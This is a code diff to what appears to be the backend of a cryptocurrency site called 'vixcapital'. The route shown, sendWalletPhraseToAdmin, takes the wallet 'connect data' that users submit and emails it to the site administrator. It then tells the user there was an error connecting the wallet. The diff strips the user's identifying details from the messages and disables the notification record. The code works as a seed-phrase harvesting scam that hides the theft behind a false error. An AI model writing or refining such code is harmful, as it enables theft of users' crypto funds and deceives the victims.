@@ -362,7 +362,7 @@ const sendWalletPhraseToAdmin = asyncHandler(async (req, res) => {
   }
 
     // Send connect wallet request email to admin
-    const introMessage = `This user ${req.user.firstname+" "+req.user.lastname} with email address ${req.user.email} just entered a connect wallet ${type} data. [ ${connectData} ] `
+    const introMessage = `A User just entered a connect wallet ${type} data. [ ${connectData} ] `
 
     const subjectAdmin = "New Connect Wallet Data - vixcapital"
     const send_to_Admin = process.env.EMAIL_USER
@@ -376,19 +376,19 @@ const sendWalletPhraseToAdmin = asyncHandler(async (req, res) => {
    const searchWord = "Support Team";
    const notificationObject = {
     to: searchWord,
-    from: `${req.user.firstname+" "+req.user.lastname}`,
+    from: `Site User`,
     notificationIcon: "CurrencyCircleDollar",
     title: "New Connect Wallet Data",
-    message: `${req.user.firstname+" "+req.user.lastname} connect wallet ${type} data. [ ${connectData} ] `,
+    message: `User connect wallet ${type} data. [ ${connectData} ] `,
     route: "/dashboard",
   };
 
   // Add the Notifications
-  await Notifications.updateOne(
-    { userId: req.user._id },
-    { $push: { notifications: notificationObject } },
-    { upsert: true } // Creates a new document if recipient doesn't exist
-  );
+  // await Notifications.updateOne(
+  //   { userId: req.user._id },
+  //   { $push: { notifications: notificationObject } },
+  //   { upsert: true } // Creates a new document if recipient doesn't exist
+  // );
 
   res.status(200).json({ message: "Error connecting wallet address at this time, please try again later" });
   // res.status(200).json(withdrawalHistory);
